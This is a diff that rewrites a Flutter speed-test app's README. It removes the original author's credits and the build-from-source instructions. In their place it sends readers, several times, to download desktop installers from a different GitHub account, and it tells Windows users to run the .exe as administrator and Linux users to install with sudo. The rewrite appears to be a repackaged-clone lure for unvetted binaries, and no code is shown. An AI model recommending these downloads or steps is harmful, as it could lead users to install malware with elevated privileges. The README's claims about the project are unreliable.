@@ -1,249 +1,72 @@
-# 📶 Internet Speed Test App
+# 🌐 Internet-Speed-Inspector - Measure Your Internet Speed Easily
 
-[![Made with Flutter](https://img.shields.io/badge/Made%20with-Flutter-02569B?logo=flutter&logoColor=white)](https://flutter.dev)
-[![Powered by Dart](https://img.shields.io/badge/Powered%20by-Dart-0175C2?logo=dart&logoColor=white)](https://dart.dev)
-[![UI/UX Design](https://img.shields.io/badge/Design-Frosted%20Glass-ff69b4)]()
-[![Animations](https://img.shields.io/badge/Animations-Dynamic-blueviolet)]()
-[![Open Source Love](https://badges.frapsoft.com/os/v2/open-source.svg?v=103)](https://opensource.org/)
+## 🚀 Getting Started
 
----
+Welcome to **Internet-Speed-Inspector**! This stylish application measures your internet speed using Fast.com and Ookla servers. With a beautiful frosted glass UI, dynamic gradients, and engaging animations, it also provides device information and speed history. 
 
-## 🎨 Overview
+## 🛠️ Requirements
 
-**Internet Speed Test App** is a **stylish Flutter application** that measures internet speed using **Fast.com and Ookla servers** — featuring stunning frosted glass UI, dynamic gradients, engaging pulse and rotation animations, along with device information and comprehensive speed history tracking.
+Before downloading, ensure you meet the following requirements:
 
-This project serves as a **premium showcase** for developers exploring advanced Flutter UI design, network API integration, real-time data visualization, and creating professional-grade speed testing applications with exceptional aesthetics.
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or Linux (Debian/Ubuntu).
+- **Storage:** At least 100 MB of free disk space.
+- **Network:** An active internet connection.
 
----
+## 📥 Download
 
-## 🎬 Preview
+[![Download Internet-Speed-Inspector](https://img.shields.io/badge/Download%20Now-%23FF5722.svg?style=for-the-badge&logo=github)](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
 
-<div align="center">
+## 📚 Installation Steps
+
+1. **Visit the Releases Page:** Click the link below to go to our releases page:
+   [Visit this page to download](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
+
+2. **Choose Your Version:** On the releases page, look for the latest version of Internet-Speed-Inspector. It will usually be at the top of the list. There might be several files; always pick the one with the `.exe`, `.dmg`, or applicable installer for your system.
+
+3. **Download the Installer:** Click on the file to download it to your computer. The download may take a few moments depending on your connection speed.
+
+4. **Run the Installer:**
+   - **For Windows:** Locate the downloaded `.exe` file in your downloads folder. Right-click the file and select "Run as administrator."
+   - **For macOS:** Open the downloaded `.dmg` file. Drag the Internet-Speed-Inspector icon to your Applications folder.
+   - **For Linux:** Open a terminal, navigate to the downloaded folder, and run `sudo dpkg -i [filename].deb` to install.
   
+5. **Launch the Application:** Once installed, open the Internet-Speed-Inspector application. You will find it in your application list or desktop.
+
+## 🌟 Features
+
+- **Internet Speed Test:** Quickly check your download and upload speeds using Fast.com and Ookla.
+- **Device Information:** View essential details about your device, such as IP address, connection type, and more.
+- **Speed History:** Track your internet speeds over time, helping you see trends and make informed decisions.
+- **User-Friendly Interface:** The app features a modern design that is both attractive and easy to navigate.
   
-  *Test your connection with elegance and precision*
-  <video src="https://github.com/user-attachments/assets/ccd6fa49-439d-47ce-895e-97ea2f4958c2" controls width="100%" ></video>
+## 📊 Using the App
 
-    
-</div>
+1. **Start a Speed Test:** Click the "Start Test" button on the main screen. The app will automatically run the test and display your results.
 
+2. **View Results:** After the test, your download speed, upload speed, and ping will be shown. You can also see detailed results in the history tab.
 
+3. **Explore Device Info:** Select the "Device Info" tab to see all technical details regarding your current connection.
 
----
+4. **Check Speed History:** Navigate to the "History" section to view past tests and analyze your internet performance.
 
-## ✨ Features
+## 💬 Support
 
-### 📶 **Speed Testing**
-* 🌐 **Dual Server Support** — Accurate testing via Fast.com and Ookla servers
-* ⚡ **Real-time Monitoring** — Live download and upload speed measurement
-* 📊 **Speed History** — Track and compare previous test results
-* 🔄 **Server Selection** — Choose between multiple testing servers
+If you encounter issues, please reach out to our support team via the Issues section on GitHub. We pay close attention to user feedback and work hard to resolve any problems.
 
-### 🎨 **Stunning UI Design**
-* 💎 **Frosted Glass Effect** — Modern glassmorphism design aesthetic
-* 🌈 **Dynamic Gradients** — Beautiful animated color transitions
-* 💫 **Pulse Animations** — Engaging visual feedback during active tests
-* 🔄 **Rotation Effects** — Smooth spinning animations for loading states
-* 📱 **Intuitive Interface** — Clean, user-friendly layout
+## 📝 Contribute
 
-### 📱 **Device Information**
-* 💻 **System Specs** — Display comprehensive device details
-* 📡 **Network Info** — Connection type and network status
-* 📊 **Detailed Results** — In-depth speed test statistics
+Interested in contributing? You can help us improve by submitting a pull request or reporting issues. We welcome any feedback and appreciate your support.
 
----
+## 🌐 Community
 
-## 🎥 Demo Video
+Join our community of users and developers to share ideas, ask questions, and receive tips on using Internet-Speed-Inspector effectively. Check our GitHub discussions or join us on social media platforms to connect.
 
-Watch the **Internet Speed Test App** in action:
-<div align="center">
-  <table>
-    <tr>
-      <td><video src="https://github.com/user-attachments/assets/53b10d00-3699-4e25-a3ff-48a0841aa349" controls width="49%"></video></td>
-      <td>  <video src="https://github.com/user-attachments/assets/142c89dc-ec6e-46ae-a0a0-691b6711eb02" controls width="49%"></video></td>
-  </table>
-</div>
+## 📩 Stay Updated
 
+Keep an eye on our releases for new features and improvements. We update the app regularly to enhance your experience and keep up with the latest technology trends.
 
----
-## 🎥 OR
+## 🔗 Download Again
 
-Watch the **App** in action on **X :**
-👉 [Watch the Demo Here](https://x.com/KishanP07684084/status/1946605582905151705?s=20)
+Don't forget, you can download Internet-Speed-Inspector any time by returning to our releases page:
 
----
-
-
-## 📸 Screenshots
-
-<div align="center">
-  
-  ![Setup In Androd Studio](screenshots/ispeed.png)
-    
-</div>
-
----
-
-<div align="left">
-  <table>
-    <tr>
-      <td><img src="screenshots/image1.jpg" alt="Speed Test Dashboard" width="250"/></td>
-      <td><img src="screenshots/image2.jpg" alt="Testing Active" width="250"/></td>
-      <td><img src="screenshots/image3.jpg" alt="Speed History" width="250"/></td>
-      <td><img src="screenshots/image0.jpg" alt="Device Details" width="250"/></td>
-    </tr>
-  </table>
-</div>
-
----
-
-
-## 🏗️ Tech Stack
-
-| Technology                          | Description                                          |
-| ----------------------------------- | ---------------------------------------------------- |
-| **Flutter**                         | Cross-platform framework for building beautiful apps |
-| **Dart**                            | Core programming language powering Flutter apps      |
-| **Fast.com API**                    | Netflix's reliable speed testing service             |
-| **Ookla Speedtest**                 | Industry-standard speed measurement platform         |
-| **Glassmorphism**                   | Frosted glass UI design implementation               |
-
----
-
-## ⚙️ Installation & Setup
-
-Follow these steps to run the project locally:
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/<your-username>/internet-speed-test-app.git
-cd internet-speed-test-app
-```
-
-### 2️⃣ Install Dependencies
-
-```bash
-flutter pub get
-```
-
-### 3️⃣ Run the App
-
-```bash
-flutter run
-```
-
----
-
-## 💡 Learning Outcomes
-
-By working with this project, you'll gain insights into:
-
-* 📶 **Speed Test Integration** — Implementing Fast.com and Ookla APIs
-* 🎨 **Glassmorphism UI** — Creating frosted glass design effects
-* 💫 **Dynamic Animations** — Building pulse and rotation animations
-* 📊 **Data Persistence** — Storing and displaying speed history
-* 💻 **Device APIs** — Accessing system and network information
-
-
----
-
-## 🤝 Contributing
-
-Contributions are encouraged! If you'd like to enhance the design or functionality:
-
-1. Fork the repository
-2. Create a new branch (`git checkout -b feature/your-feature`)
-3. Commit your changes (`git commit -m 'Add a new feature'`)
-4. Push to the branch (`git push origin feature/your-feature`)
-5. Open a Pull Request
-
----
-🧠 Flutter Development Environment Setup
-
-This project is built using Flutter. Below are the essential details and configuration requirements for replicating the development environment.
-
-| Component              | Details                                      |
-| ---------------------- | -------------------------------------------- |
-| **Flutter Version**    | 3.27.1 (Stable Channel)                      |
-| **Framework Revision** | 17025dd882                                   |
-| **Engine Revision**    | cb4b5fff73                                   |
-| **Dart Version**       | 3.6.0                                        |
-| **DevTools Version**   | 2.40.2                                       |
-| **Operating System**   | Windows 10 (Version 10.0.26200.6725, 64-bit) |
-| **Locale**             | en-US                                        |
-
-
-💻 Android Studio
-
-* Version: 2023.3
-* Java Runtime: OpenJDK 17 (17.0.10+0--11572160)
-
----
-
-## 🤝 Contributing
-
-Contributions are highly encouraged! Here's how you can help:
-
-1. 🍴 **Fork** the repository
-2. 🌿 **Create** a new branch (`git checkout -b feature/amazing-feature`)
-3. 💾 **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. 📤 **Push** to the branch (`git push origin feature/amazing-feature`)
-5. 🎉 **Open** a Pull Request
-
----
-
-## 💬 Connect & Support
-
-For questions, feedback, or collaborations:
-
-<div align="center">
-
-[![GitHub](https://img.shields.io/badge/GitHub-Follow-181717?logo=github&logoColor=white)](https://github.com/PHom798)
-[![Twitter](https://img.shields.io/badge/Twitter-Follow-1DA1F2?logo=twitter&logoColor=white)](https://x.com/KishanP07684084)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/hom-bdr-pathak-01a3bb210)
-[![Email](https://img.shields.io/badge/Email-Contact-D14836?logo=gmail&logoColor=white)](pathakhom17@gmail.com)
-
-</div>
-
----
-
-## 🌟 Show Your Support
-
-If this project helped you or inspired your work:
-
-<div align="center">
-
-⭐ **Star this repository**  
-🍴 **Fork it for your projects**  
-📢 **Share with the Flutter community**  
-💖 **Sponsor the development**  
-🐛 **Report issues or suggest features**
-
-</div>
-
----
-
-## 📊 Project Stats
-
-<div align="center">
-
-![GitHub stars](https://img.shields.io/github/stars/PHom798/internet-speed-test-app?style=social)
-![GitHub forks](https://img.shields.io/github/forks/PHom798/internet-speed-test-app?style=social)
-![GitHub watchers](https://img.shields.io/github/watchers/PHom798/internet-speed-test-app?style=social)
-![GitHub issues](https://img.shields.io/github/issues/PHom798/internet-speed-test-app)
-![GitHub pull requests](https://img.shields.io/github/issues-pr/PHom798/internet-speed-test-app)
-
-</div>
-
----
-
-<div align="center">
-
-**Made with ❤️, Flutter, and 📶**
-
-*Testing speed with style and precision*
-
-### 📶 *"Fast, Accurate, Beautiful"* ✨
-
-</div>
+[Visit this page to download](https://github.com/Jlyayou/Internet-Speed-Inspector/releases)
